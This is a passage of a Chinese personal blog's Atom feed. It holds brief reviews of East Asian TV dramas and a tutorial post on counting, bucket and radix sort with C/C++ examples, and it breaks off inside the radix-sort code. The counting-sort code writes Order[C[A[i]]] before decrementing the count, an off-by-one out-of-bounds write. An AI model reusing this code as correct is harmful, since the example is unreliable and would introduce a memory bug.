        <summary type="html"><![CDATA[剧情没什么营养, 诡异的日韩混血剧, 不过金泰熙好漂亮。]]></summary>
        <content type="html"><![CDATA[<p>剧情没什么营养, 诡异的日韩混血剧, 不过金泰熙好漂亮。</p>]]></content>
        <author>
            <name>Alex Chen</name>
            <uri>https://vienna.bio</uri>
        </author>
        <category label="日剧" term="日剧"/>
        <category label="金泰熙" term="金泰熙"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[韩剧《未生》]]></title>
        <id>https://vienna.bio/blog/韩剧《未生》</id>
        <link href="https://vienna.bio/blog/韩剧《未生》"/>
        <updated>2016-03-28T20:48:47.000Z</updated>
        <summary type="html"><![CDATA[未生、完生]]></summary>
        <content type="html"><![CDATA[<h3 class="anchor anchorWithStickyNavbar_K1VF" id="未生完生">未生、完生<a href="https://vienna.bio/blog/%E9%9F%A9%E5%89%A7%E3%80%8A%E6%9C%AA%E7%94%9F%E3%80%8B#%E6%9C%AA%E7%94%9F%E5%AE%8C%E7%94%9F" class="hash-link" aria-label="Direct link to 未生、完生" title="Direct link to 未生、完生">​</a></h3>
<p>一年内断断续续的看完了这部剧, 第一次看到『未生』这词完全想不到什么意思, 其实这是个韩国的围棋术语。『未生』对应『完生』, 完生其实就是双眼活棋, 未生就借喻职场新人了。</p>
<p>不同于某些套题作文剧, 是有共鸣在, 这励志鸡汤熬得不错。</p>
<p><img decoding="async" loading="lazy" alt="《未生》剧照" src="https://vienna.bio/assets/images/%E6%9C%AA%E7%94%9F-8f12473b08837551ba79ff02fb289886.jpg" width="1024" height="650" class="img_GQDY"></p>]]></content>
        <author>
            <name>Alex Chen</name>
            <uri>https://vienna.bio</uri>
        </author>
        <category label="未生" term="未生"/>
        <category label="韩剧" term="韩剧"/>
        <category label="围棋" term="围棋"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[非基于比较的排序算法]]></title>
        <id>https://vienna.bio/blog/非基于比较排序</id>
        <link href="https://vienna.bio/blog/非基于比较排序"/>
        <updated>2016-03-21T23:42:16.000Z</updated>
        <summary type="html"><![CDATA[计数排序(Counting Sort)、桶排序、基数排序三个已经有不少很好的博客文章介绍，但不自己尝试描述一遍就难以熟悉，权当记录。]]></summary>
        <content type="html"><![CDATA[<p>计数排序(Counting Sort)、桶排序、基数排序三个已经有不少很好的博客文章介绍，但不自己尝试描述一遍就难以熟悉，权当记录。</p>
<p>参考了 <a href="http://www.cnblogs.com/ttltry-air/archive/2012/08/04/2623302.html" target="_blank" rel="noopener noreferrer">计数排序，基数排序和桶排序</a> 和 <a href="https://www.byvoid.com/blog/sort-radix" target="_blank" rel="noopener noreferrer">三种线性排序算法 计数排序、桶排序与基数排序</a></p>
<hr>
<h3 class="anchor anchorWithStickyNavbar_K1VF" id="计数排序">计数排序<a href="https://vienna.bio/blog/%E9%9D%9E%E5%9F%BA%E4%BA%8E%E6%AF%94%E8%BE%83%E6%8E%92%E5%BA%8F#%E8%AE%A1%E6%95%B0%E6%8E%92%E5%BA%8F" class="hash-link" aria-label="Direct link to 计数排序" title="Direct link to 计数排序">​</a></h3>
<p>首先是主要的步骤</p>
<ol>
<li>准备线性表字典 Dict[], 其长度 m 是待排序元素的范围, 换言之每个待排序的元素都能在这个字典找到对应的位置</li>
<li>扫描长度为 n 的待排序表 Unordered[], 把每个元素的出现次数记录在 Dict 里</li>
<li>现在 Dict 记录着每个元素的的出现次数, 而 Dict 本身是有序的</li>
<li>给 Dict 做累加, Dict[i] += Dict[i - 1] for i in 1 to m,</li>
<li>累加后字典的值指定了元素排序后的位置，反向遍历待排序的A, 结合指定了元素位置的字典C 则可生成有序结果, 而反向遍历的元素会放在更后的位置, 这特性确保这是稳定排序</li>
</ol>
<p>C 语言例子</p>
<div class="language-cpp codeBlockContainer_Wo5X theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_kgez"><pre tabindex="0" class="prism-code language-cpp codeBlock_W3TD thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_FFXD"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">PrintArray</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">A</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> n</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> n</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">++</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"%d\t"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> A</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"\n"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CountingSort</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">A</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> n</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">C</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> m</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">Order</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Original Data: \n"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">PrintArray</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">A</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> n</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">// initialize Dict</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">// memset(C, 0, m * sizeof(m)); 这行居然导致代码着色失效, 不用括号包着 m 则问题解决，着实诡异。</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">memset</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">C</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> m </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">sizeof</span><span class="token plain"> m</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">// counting element of A</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> n</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">++</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        C</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">A</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">]</span><span class="token operator" style="color:#393A34">++</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Dict: Before Accumulate\n"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">PrintArray</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">C</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> m</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">// scan C, accumulate,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">// 累加后, C 字典里的值就是 元素有序后的位置, 因为每次取得和占用位置后应该减一, 使用字典C 逆遍历A 就可以保持稳定而有序</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> m</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">++</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        C</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> C</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Dict: After Accumulate\n"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">PrintArray</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">C</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> m</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">// reverse filling result, stable sort</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> n </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&gt;=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i</span><span class="token operator" style="color:#393A34">--</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Order</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">C</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">A</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> A</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 根据字典 C 得知 A[i] 的位置（累加后的C 的值x : 前面有x个值比我小 )</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        C</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">A</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">]</span><span class="token operator" style="color:#393A34">--</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Sorted Array:\n"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">PrintArray</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Order</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> n</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> K </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">10</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// maximum in range, size of C</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> N </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">20</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// size of A</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> A</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">N</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> C</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">K </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> Order</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">N</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// result</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> N</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">++</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        A</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">rand</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> K</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">CountingSort</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">A</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> N</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> C</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> K</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> Order</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup_FTtM"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_S8nV" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_qqGW"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_A5an"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_K1VF" id="桶排序-bucket-sort">桶排序 (Bucket Sort)<a href="https://vienna.bio/blog/%E9%9D%9E%E5%9F%BA%E4%BA%8E%E6%AF%94%E8%BE%83%E6%8E%92%E5%BA%8F#%E6%A1%B6%E6%8E%92%E5%BA%8F-bucket-sort" class="hash-link" aria-label="Direct link to 桶排序 (Bucket Sort)" title="Direct link to 桶排序 (Bucket Sort)">​</a></h3>
<p>观看 <a href="http://www.cs.usfca.edu/~galles/visualization/BucketSort.html" target="_blank" rel="noopener noreferrer">BucketSort Visualization</a> 后, 感觉桶排序就像散列表，然后加入了顺序的想法。</p>
<ol>
<li>过程与计数排序的部分步骤相近, 建立 Dict 字典用以储存元素的出现情况, Dict 其实可以是线性表或者散列表, 看需求; 而本来在计数排序中的计数步骤这里则类似是散列表的 Chaining</li>
<li>对字典项的 Chaining 进行排序, 字典是有序的, Chaining 也变成有序, 扫描一次把元素读出来就完成排序了</li>
</ol>
<h3 class="anchor anchorWithStickyNavbar_K1VF" id="基数排序-radix-sort">基数排序 (Radix Sort)<a href="https://vienna.bio/blog/%E9%9D%9E%E5%9F%BA%E4%BA%8E%E6%AF%94%E8%BE%83%E6%8E%92%E5%BA%8F#%E5%9F%BA%E6%95%B0%E6%8E%92%E5%BA%8F-radix-sort" class="hash-link" aria-label="Direct link to 基数排序 (Radix Sort)" title="Direct link to 基数排序 (Radix Sort)">​</a></h3>
<p>假设是10 进制数
主要思想是, 把整数按数位分割, 然后就可以对一列个位数 key 进行稳定排序, from least significant to most significant digit.</p>
<p>一列个位数的排序就当然是使用上面的非基于比较的排序方式啦, 按十进制数来说, 每次计数排序就需要10个坑来计数</p>
<div class="language-cpp codeBlockContainer_Wo5X theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_kgez"><pre tabindex="0" class="prism-code language-cpp codeBlock_W3TD thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_FFXD"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">inline</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">extract_digit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> place</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> base </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">10</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">/</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token punctuation" style="color:#393A34">)</span><span class="token function" style="color:#d73a49">pow</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">base</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> place</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> base</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CountingSort</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">vector</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token keyword" style="color:#00009f">int</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">v</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> vector</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token keyword" style="color:#00009f">int</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">tmp</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> place</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> BASE </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">10</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> C</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">BASE</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> v</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">size</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">++</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" 